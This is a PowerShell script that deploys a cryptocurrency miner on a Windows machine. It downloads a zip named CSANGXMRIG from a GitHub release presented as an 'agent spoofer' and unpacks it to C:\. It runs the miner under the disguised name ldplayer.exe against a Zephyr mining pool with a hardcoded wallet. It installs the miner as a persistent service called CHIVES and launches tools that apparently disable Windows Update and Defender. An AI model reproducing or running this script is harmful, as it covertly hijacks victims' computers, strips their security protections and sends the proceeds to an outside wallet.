
$tCommand = if (-not (Test-Path ($tCommand = [System.IO.Path]::Combine($env:ProgramFiles, 'Windows Defender', 'MSASCui.exe')) -PathType Leaf)) { "windowsdefender://Threatsettings" } else { $tCommand }; Start-Process $tCommand
Start-Sleep -Seconds 20
$downloadPath = Join-Path -Path $env:USERPROFILE -ChildPath "Desktop"
$url = "https://github.com/trangtrau/random-agent-spoofer/releases/download/SA/CSANGXMRIG.zip"
Invoke-WebRequest -Uri $url -OutFile "$downloadPath\CSANGXMRIG.zip"
$destinationPath = "C:\" 
Expand-Archive -Path "$downloadPath\CSANGXMRIG.zip" -DestinationPath $destinationPath -Force
Start-Sleep -Seconds 2
Set-Location -Path "C:\CSANGXMRIG\"
$userName = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
$userName = $userName -replace "^.*\\", ""
$folderPath = "C:\CSANGXMRIG\"
$batContent = @"
cd %~dp0
ldplayer.exe -o zephyr.miningocean.org:5332 -u ZEPHs7NJgxsL55Zfyj2Yd1QgHT7HQvXjtgxrus6UPZbQ7ZJjcSAASu4cE7cHDzdUvxXBRkuV3V3rgdEHA3W6gqCTXbGRujkJ24H -p $userName -a rx/0 -k -t 8
pause
"@
$batContent | Set-Content -Path (Join-Path -Path $folderPath -ChildPath "van.bat") -Force
New-Item -Path "$env:USERPROFILE\Desktop\Service_OK.dat" -ItemType File
Start-Process -FilePath "nssm.exe" -ArgumentList "install CHIVES `"$folderPath\van.bat`""
Start-Sleep -Seconds 2
Start-Sleep -Seconds 1
Start-Process -FilePath "wub.exe" -ArgumentList "/D"
Start-Process -FilePath "dfControl.exe"
Start-Sleep -Seconds 1
Start-Process -FilePath "nssm.exe" -ArgumentList "start CHIVES"
